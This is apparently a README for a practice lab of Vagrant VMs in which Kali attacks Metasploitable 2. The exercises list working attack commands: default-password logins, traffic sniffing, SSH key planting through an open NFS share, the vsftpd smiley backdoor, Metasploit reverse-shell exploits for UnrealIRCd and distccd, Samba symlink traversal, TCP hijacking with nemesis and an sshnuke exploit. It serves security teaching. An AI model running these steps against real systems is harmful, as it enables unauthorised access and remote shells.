
# Overview

Vagrant images to run several security tests 

### Images included
***FreeBSD-12-2

***Kali-Linux-3

***Metasploitable-2

### Requirements
**VirtualBox
https://www.virtualbox.org/wiki/Downloads

**Vagrant
https://www.vagrantup.com

### Development workflow

1. Download the repo

### Start FreeBSD
```bash 
cd freebsd && vagrant up && vagrant ssh 
```
### Stop FreeBSD
```bash
cd freebsd && vagrant halt
```

### Start Kali
```bash
cd kali && vagrant up && vagrant ssh
```
### Stop Kali
```bash
cd kali && vagrant halt
```
### Start kali & FreeBSD to test firewall rules
#### Follow this video 

https://www.youtube.com/watch?v=IMqGi5lOiV4

```bash
cd firewall_tests && vagrant up 
vagrant ssh freebsd
vagrant ssh kali
```

### Stop kali & FreeBSD 
```bash
cd firewall_tests && vagrant halt
```

### Start Metasploitable 
```bash
cd metasploitable && vagrant up && vagrant ssh
```

### Stop Metasploitable
```bash
cd metasploitable && vagrant halt
```

## Practice Kali vs Metasploitable

#### Follow this video 

https://www.youtube.com/watch?v=PM-eVrc9JY4

```
cd metasploitable && vagrant up
vagrant ssh 
sudo su - 
```
Open a new terminal 
```
cd kali && vagrant up
vagrant ssh
sudo su - 
```
### Exercises
#### 1.Easy Passwords '123'

##### KALI
- [ ] ssh -l root 192.168.33.3
- [ ] export PGPASSWORD='postgres';psql -U postgres -h 192.168.33.3
#### 2.Using old services Passwords '123'
##### KALI
- [ ] rlogin -l root 192.168.33.3
- [ ] export PGPASSWORD='postgres';psql -U postgres -h 192.168.33.3
##### Metasploitable
- [ ] tcpdump -nli eth1 '(length > 74)' -s 0 -w - | strings
#### 3.Sharing way too much resources (NFS server, insecure setup sharing / )
##### KALI
- [ ] rpcinfo -p 192.168.33.3
- [ ] showmount -e 192.168.33.3
- [ ] mkdir /tmp/r00t
- [ ] mount -t nfs 192.168.33.3:/ /tmp/r00t/
- [ ] cat ~/.ssh/id_rsa.pub >> /tmp/r00t/root/.ssh/authorized_keys
- [ ] umount /tmp/r00t
- [ ] ssh 192.168.33.3
#### 4.Telnet All information, including passwords, is transmitted unencrypted (making it open to interception). pass = '123' 
##### KALI
- [ ] telnet 192.168.33.3
##### Metasploitable
- [ ] tcpdump -nli eth1 '(length > 74)' -s 0 -w - | strings
#### 5.Backdoors
##### KALI
- [ ] telnet 192.168.33.3 6200
- [ ] telnet 192.168.33.3 21
- [ ] user manolo
- [ ] pass 123
- [ ] C[^
- [ ] telnet 192.168.33.3 21
- [ ] user manolo:)
- [ ] pass 123
- [ ] open new metasploitable terminal
- [ ] telnet 192.168.33.3 6200
- [ ] you are in
#### 5.Metasploit UnreaIRCD IRC daemon port 6667
##### KALI
- [ ] msfconsole
- [ ] search cmd/unix
- [ ] use exploit/unix/irc/unreal_ircd_3281_backdoor
- [ ] set RHOST 192.168.33.3
- [ ] set LHOST 192.168.33.2
- [ ] set PAYLOAD cmd/unix/reverse 
- [ ] exploit
- [ ] you are in
#### 6.Unintentional Backdoors distccd this program makes it easy to scale large compiler jobs across a farm of like-configured systems. 
##### KALI
- [ ] msfconsole
- [ ] use exploit/unix/misc/distcc_exec
- [ ] set RHOST 192.168.33.3
- [ ] set LHOST 192.168.33.2
- [ ] set PAYLOAD cmd/unix/reverse 
- [ ] exploit
- [ ] you are in
#### 7.Samba missconfigured, mount root on /tmp  
##### KALI
- [ ] smbclient -L //192.168.33.3 --option="client min protocol = NT1"
- [ ] msfconsole
- [ ] use auxiliary/admin/smb/samba_symlink_traversal  
- [ ] set RHOST 192.168.33.3
- [ ] set LHOST 192.168.33.2
- [ ] set SMBSHARE tmp
- [ ] exploit
- [ ] smbclient //192.168.33.3/tmp --option="client min protocol = NT1"
- [ ] you can browse the whole root directory
#### 9.Nemesis hijack tcp connection pass= '123'
##### KALI

    
- [ ] telnet 192.168.33.3
##### Metasploitable
- [ ] tcpdump -p tcp -nnvvXS -i  eth1
##### KALI new terminal
###### Algorithm
  I = I + 2
  
  s = last seq  
  
  x = new port
  
  w = new win 
  
  a = last acknowledge
- [ ] Adjust the values with the algorithm 
- [ ] echo " ;touch /tmp/GET_OUT\r\n" | nemesis tcp -v -S 192.168.33.2 -D 192.168.33.3 -w 524 -T 64 -FD -t 16 -fP -x 34952 -y 23 -I 29744 -s 2495209252 -a 1322394923  -P-
#### 9.Bad code, simple exploit on the sshd server, widely used on the internet.
##### Metasploitable
- [ ] open 2 metasploitable terminals
- [ ] /root/openssh-4.7p1/sshd -Dd -f /etc/ssh/sshd_config -p 26
- [ ] cd /root/openssh-4.7p1/; ./sshnuke localhost 26
- [ ] type any random password 
- [ ] you are in
- [ ] Review the code cd /root/openssh-4.7p1/ && vim auth-passwd.c && vim ./openbsd-compat/readpassphrase.c









